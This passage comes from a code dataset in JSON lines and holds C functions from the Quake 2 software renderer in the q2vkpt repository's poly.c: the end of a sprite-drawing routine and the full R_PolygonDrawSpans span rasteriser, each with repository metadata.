left[1];\n    pverts[0][2] = r_entorigin[2] + up[2] + left[2];\n    pverts[0][3] = 0;\n    pverts[0][4] = 0;\n\n    pverts[1][0] = r_entorigin[0] + up[0] + right[0];\n    pverts[1][1] = r_entorigin[1] + up[1] + right[1];\n    pverts[1][2] = r_entorigin[2] + up[2] + right[2];\n    pverts[1][3] = frame->width;\n    pverts[1][4] = 0;\n\n    pverts[2][0] = r_entorigin[0] + down[0] + right[0];\n    pverts[2][1] = r_entorigin[1] + down[1] + right[1];\n    pverts[2][2] = r_entorigin[2] + down[2] + right[2];\n    pverts[2][3] = frame->width;\n    pverts[2][4] = frame->height;\n\n    pverts[3][0] = r_entorigin[0] + down[0] + left[0];\n    pverts[3][1] = r_entorigin[1] + down[1] + left[1];\n    pverts[3][2] = r_entorigin[2] + down[2] + left[2];\n    pverts[3][3] = 0;\n    pverts[3][4] = frame->height;\n\n    r_polydesc.nump = 4;\n    r_polydesc.s_offset = (r_polydesc.pixel_width  >> 1);\n    r_polydesc.t_offset = (r_polydesc.pixel_height >> 1);\n    VectorCopy(modelorg, r_polydesc.viewer_position);\n\n    if (frame->image->flags & IF_TRANSPARENT)\n        textured = 2;\n    else\n        textured = 1;\n\n    if (currententity->flags & RF_TRANSLUCENT)\n        R_ClipAndDrawPoly(currententity->alpha, qfalse, textured);\n    else\n        R_ClipAndDrawPoly(1.0F, qfalse, textured);\n}", "path": "q2vkpt/src/refresh/sw/poly.c", "commit_date": "2013-03-20 00:00:00", "repo_name": "cschied/q2vkpt", "stars": 948, "license": "gpl-2.0", "language": "c", "size": 129148}
{"docstring": "/*\n** R_PolygonDrawSpans\n*/\n", "func_signal": "static void R_PolygonDrawSpans(espan_t *pspan, int iswater)", "code": "{\n    int         count;\n    fixed16_t   snext, tnext;\n    float       sdivz, tdivz, zi, z, du, dv, spancountminus1;\n    float       sdivzspanletstepu, tdivzspanletstepu, zispanletstepu;\n\n    s_spanletvars.pbase = cacheblock;\n\n    if (iswater & SURF_WARP)\n        r_turb_turb = sintable + ((int)(r_newrefdef.time * SPEED) & (CYCLE - 1));\n    else if (iswater & SURF_FLOWING)\n        r_turb_turb = blanktable;\n\n    sdivzspanletstepu = d_sdivzstepu * AFFINE_SPANLET_SIZE;\n    tdivzspanletstepu = d_tdivzstepu * AFFINE_SPANLET_SIZE;\n    zispanletstepu = d_zistepu * AFFINE_SPANLET_SIZE;\n\n// we count on FP exceptions being turned off to avoid range problems\n    s_spanletvars.izistep = (int)(d_zistepu * 0x8000 * 0x10000);\n\n    s_spanletvars.pz = 0;\n\n    do {\n        s_spanletvars.pdest   = d_spantable[pspan->v] + pspan->u * VID_BYTES;\n        s_spanletvars.pz      = d_zspantable[pspan->v] + pspan->u;\n        s_spanletvars.u       = pspan->u;\n        s_spanletvars.v       = pspan->v;\n\n        count = pspan->count;\n\n        if (count <= 0)\n            goto NextSpan;\n\n        // calculate the initial s/z, t/z, 1/z, s, and t and clamp\n        du = (float)pspan->u;\n        dv = (float)pspan->v;\n\n        sdivz = d_sdivzorigin + dv * d_sdivzstepv + du * d_sdivzstepu;\n        tdivz = d_tdivzorigin + dv * d_tdivzstepv + du * d_tdivzstepu;\n\n        zi = d_ziorigin + dv * d_zistepv + du * d_zistepu;\n        z = (float)0x10000 / zi;    // prescale to 16.16 fixed-point\n        // we count on FP exceptions being turned off to avoid range problems\n        s_spanletvars.izi = (int)(zi * 0x8000 * 0x10000);\n\n        s_spanletvars.s = (int)(sdivz * z) + sadjust;\n        s_spanletvars.t = (int)(tdivz * z) + tadjust;\n\n        if (!iswater) {\n            if (s_spanletvars.s > bbextents)\n                s_spanletvars.s = bbextents;\n            else if (s_spanletvars.s < 0)\n                s_spanletvars.s = 0;\n\n            if (s_spanletvars.t > bbextentt)\n                s_spanletvars.t = bbextentt;\n            else if (s_spanletvars.t < 0)\n                s_spanletvars.t = 0;\n        }\n\n        do {\n            // calculate s and t at the far end of the span\n            if (count >= AFFINE_SPANLET_SIZE)\n                s_spanletvars.spancount = AFFINE_SPANLET_SIZE;\n            else\n                s_spanletvars.spancount = count;\n\n            count -= s_spanletvars.spancount;\n\n            if (count) {\n                // calculate s/z, t/z, zi->fixed s and t at far end of span,\n                // calculate s and t steps across span by shifting\n                sdivz += sdivzspanletstepu;\n                tdivz += tdivzspanletstepu;\n                zi += zispanletstepu;\n                z = (float)0x10000 / zi;    // prescale to 16.16 fixed-point\n\n                snext = (int)(sdivz * z) + sadjust;\n                tnext = (int)(tdivz * z) + tadjust;\n\n                if (!iswater) {\n                    if (snext > bbextents)\n                        snext = bbextents;\n                    else if (snext < AFFINE_SPANLET_SIZE)\n                        snext = AFFINE_SPANLET_SIZE;    // prevent round-off error on <0 steps from\n                                                        // from causing overstepping & running off the\n                                                        // edge of the texture\n\n                    if (tnext > bbextentt)\n                        tnext = bbextentt;\n                    else if (tnext < AFFINE_SPANLET_SIZE)\n                        tnext = AFFINE_SPANLET_SIZE;    // guard against round-off error on <0 steps\n                }\n\n                s_spanletvars.sstep = (snext - s_spanletvars.s) >> AFFINE_SPANLET_SIZE_BITS;\n                s_spanletvars.tstep = (tnext - s_spanletvars.t) >> AFFINE_SPANLET_SIZE_BITS;\n            } else {\n                // calculate s/z, t/z, zi->fixed s and t at last pixel in span (so\n                // can't step off polygon), clamp, calculate s and t steps across\n                // span by division, biasing steps low so we don't run off the\n                // texture\n                spancountminus1 = (float)(s_spanletvars.spancount - 1);\n                sdivz += d_sdivzstepu * spancountminus1;\n                tdivz += d_tdivzstepu * spancountminus1;\n                zi += d_zistepu * spancountminus1;\n                z = (float)0x10000 / zi;    // prescale to 16.16 fixed-point\n                snext = (int)(sdivz * z) + sadjust;\n                tnext = (int)(tdivz * z) + tadjust;\n\n                if (!iswater) {\n                    if (snext > bbextents)\n                        snext = bbextents;\n                    else if (snext < AFFINE_SPANLET_SIZE)\n                        snext = AFFINE_SPANLET_SIZE;    // prevent round-off error on <0 steps from\n                                                        // from causing overstepping & running off the\n                                                        // edge of the texture\n\n                    if (tnext > bbextentt)\n                        tnext = bbextentt;\n                    else if (tnext < AFFINE_SPANLET_SIZE)\n                        tnext = AFFINE_SPANLET_SIZE;    // guard against round-off error on <0 steps\n                }\n\n                if (s_spanletvars.spancount > 1) {\n                    s_spanletvars.sstep = (snext - s_spanletvars.s) / (s_spanletvars.spancount - 1);\n                    s_spanletvars.tstep = (tnext - s_spanletvars.t) / (s_spanletvars.spancount - 1);\n                }\n            }\n\n            if (iswater) {\n                s_spanletvars.s = s_spanletvars.s & ((CYCLE << 16) - 1);\n                s_spanletvars.t = s_spanletvars.t & ((CYCLE << 16) - 1);\n            }\n\n            r_polydesc.drawspanlet();\n\n            s_spanletvars.s = snext;\n            s_spanletvars.t = tnext;\n\n        } while (count > 0);\n\nNextSpan:\n        pspan++;\n\n    } while (pspan->count != DS_SPAN_LIST_END);\n}", "path": "q2vkpt/src/refresh/sw/poly.c", "commit_date": "2013-03-20 00:00:00", "repo_name": "cschied/q2vkpt", "stars": 948, "license": "gpl-2.0", "language": "c", "size": 129148}
